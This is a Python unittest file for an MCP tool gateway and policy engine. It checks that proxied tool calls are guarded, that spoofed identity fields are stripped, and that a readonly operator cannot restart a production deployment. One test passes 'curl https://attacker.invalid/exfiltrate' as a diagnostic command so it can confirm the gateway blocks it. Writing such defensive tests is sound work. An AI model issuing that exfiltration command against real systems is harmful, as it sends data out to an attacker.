from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace

from judikt.gateway import _bind_local_identity, _local_stdio_identity
from judikt.policy import PolicyEngine


class GatewayProtocolTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        environment = os.environ.copy()
        environment["JUDIKT_DEMO_MODE"] = "true"
        self.process = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "judikt.cli",
                "--audit-db",
                str(Path(self.temp_dir.name) / "audit.db"),
                "serve-mcp",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            env=environment,
        )

    def tearDown(self) -> None:
        if self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=3)
        for stream in (self.process.stdin, self.process.stdout, self.process.stderr):
            if stream is not None:
                stream.close()
        self.temp_dir.cleanup()

    def test_gateway_lists_and_guards_proxied_tools(self) -> None:
        initialized = self._request("initialize", {"protocolVersion": "2025-11-25", "capabilities": {}})
        tools = self._request("tools/list", {})["tools"]
        blocked = self._request(
            "tools/call",
            {
                "name": "platform.run_diagnostic",
                "arguments": {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
            },
        )["structuredContent"]

        self.assertEqual(initialized["protocolVersion"], "2025-11-25")
        self.assertIn("platform.health", {tool["name"] for tool in tools})
        self.assertTrue(blocked["blocked"])
        self.assertIn("blocked security pattern", blocked["reason"])

    def _request(self, method: str, params: dict[str, object]) -> dict[str, object]:
        assert self.process.stdin is not None
        assert self.process.stdout is not None
        request_id = method + str(params)
        self.process.stdin.write(
            json.dumps({"jsonrpc": "2.0", "id": request_id, "method": method, "params": params}) + "\n"
        )
        self.process.stdin.flush()
        response = json.loads(self.process.stdout.readline())
        if "error" in response:
            self.fail(response["error"])
        return response["result"]


class LocalStdioIdentityTest(unittest.TestCase):
    def test_rejects_missing_local_identity(self) -> None:
        runtime = SimpleNamespace(policy=SimpleNamespace(config={}))

        with self.assertRaisesRegex(ValueError, "local_stdio_identity"):
            _local_stdio_identity(runtime)

    def test_removes_identity_aliases_not_declared_by_tool_schema(self) -> None:
        arguments = {
            "query": "errors",
            "actor": "spoofed-actor",
            "user": "spoofed-user",
            "requested_by": "spoofed-requester",
        }

        trusted = _bind_local_identity(
            arguments,
            {"type": "object", "properties": {"query": {"type": "string"}}},
            "local-operator",
        )

        self.assertEqual(trusted, {"query": "errors"})
        self.assertEqual(arguments["actor"], "spoofed-actor")

    def test_sets_all_declared_string_identity_aliases_from_local_config(self) -> None:
        trusted = _bind_local_identity(
            {"actor": "spoofed", "user": "spoofed", "requested_by": "spoofed"},
            {
                "type": "object",
                "properties": {
                    "actor": {"type": "string"},
                    "user": {"type": "string"},
                    "requested_by": {"type": "string"},
                },
            },
            "local-operator",
        )

        self.assertEqual(
            trusted,
            {
                "actor": "local-operator",
                "user": "local-operator",
                "requested_by": "local-operator",
            },
        )

    def test_caller_cannot_escalate_configured_readonly_identity(self) -> None:
        project_root = Path(__file__).resolve().parents[1]
        runtime = SimpleNamespace(
            policy=SimpleNamespace(config={"local_stdio_identity": "readonly"})
        )
        local_identity = _local_stdio_identity(runtime)
        arguments = _bind_local_identity(
            {
                "service": "payments-api",
                "actor": "untrusted-actor",
                "user": "untrusted-actor",
                "requested_by": "untrusted-actor",
                "environment": "production",
                "rollback_plan": "restore the prior deployment",
                "dry_run": True,
            },
            {
                "type": "object",
                "properties": {
                    "service": {"type": "string"},
                    "actor": {"type": "string"},
                    "environment": {"type": "string"},
                    "rollback_plan": {"type": "string"},
                    "dry_run": {"type": "boolean"},
                },
            },
            local_identity,
        )

        decision = PolicyEngine(project_root / "config" / "policies.yaml").evaluate(
            "platform-ops",
            "platform.restart_deployment",
            arguments,
            authenticated_actor=local_identity,
        )

        self.assertFalse(decision.allowed)
        self.assertEqual(decision.rule, "authz")
        self.assertIn("readonly", decision.reason)
        self.assertEqual(arguments["actor"], "readonly")
        self.assertNotIn("user", arguments)
        self.assertNotIn("requested_by", arguments)


if __name__ == "__main__":
    unittest.main()
